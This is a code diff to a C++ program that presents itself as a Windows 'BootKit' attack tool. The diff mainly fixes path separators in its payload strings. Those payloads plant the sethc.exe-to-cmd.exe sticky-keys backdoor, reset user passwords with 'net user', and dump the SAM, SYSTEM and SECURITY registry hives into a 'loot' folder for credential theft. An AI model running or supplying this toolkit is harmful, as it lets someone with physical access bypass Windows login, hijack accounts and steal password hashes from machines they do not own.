@@ -8,7 +8,7 @@ using namespace termcolor;
 
 // Set variable 
 string banner = "-------------------------------------\n ______              _ _    _ _      \n(____  \\            | | |  / |_)_    \n ____)  ) ___   ___ | | | / / _| |_  \n|  __  ( / _ \\ / _ \\| | |< < | |  _) \n| |__)  ) |_| | |_| | | | \\ \\| | |__ \n|______/ \\___/ \\___/|_|_|  \\_)_|\\___)\n\nBy Perrtatter\nhttps://github.com/Perrtatter/Windows-BootKitn\n-------------------------------------";
-string bin_path = "C:/Windows/System32";
+string bin_path = "C:\\Windows\\System32";
 string choice;
 bool running = true;
 
@@ -68,7 +68,7 @@ int main(){
 
         if (choice == "1"){
             // Replace sethc.exe to cmd.exe
-            string payload = "move " + bin_path + "/sethc.exe " + bin_path + "/sethc.exe.bak && cp " + bin_path + "/cmd.exe " + bin_path + "/sethc.exe";
+            string payload = "move " + bin_path + "\\sethc.exe " + bin_path + "\\sethc.exe.bak && cp " + bin_path + "\\cmd.exe " + bin_path + "\\sethc.exe";
             system(payload.c_str());
 
             // Show success message 
@@ -77,7 +77,7 @@ int main(){
 
         else if (choice == "2"){
             // List user
-            string payload = bin_path + "/net user";
+            string payload = bin_path + "\\net user";
             system(payload.c_str());
             cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
         }
@@ -94,7 +94,7 @@ int main(){
             cin >> password;
 
             // Change password
-            string payload = bin_path + "/net user " + username + " " + password;
+            string payload = bin_path + "\\net user " + username + " " + password;
             system(payload.c_str());
             
             // Show success message 
@@ -105,8 +105,6 @@ int main(){
             // Dump SAM base
             string payload = "@echo off && cd loot && mkdir %USERNAME%_base_sam && cd %USERNAME%_base_sam >NUL 2>&1 && reg save hklm\\sam ./sam.save && reg save hklm\\system ./system.save && reg save hklm\\security ./security.save ";
             system(payload.c_str());
-
-            system("echo test > loot/test.txt");
 
             // Show loot export success message 
             cout << "[" << blue << "*" << reset << "] Loot exfiltrate as : " << blue << "'/loot/[PC-USERNAME]'" << reset << endl;
@@ -132,7 +130,7 @@ int main(){
 
 
     // Shutdwon PC
-    string payload = bin_path + "/shutdown -h";
+    string payload = bin_path + "\\shutdown -h";
     system(payload.c_str());
 
     // Return 0 , cause is a int loop
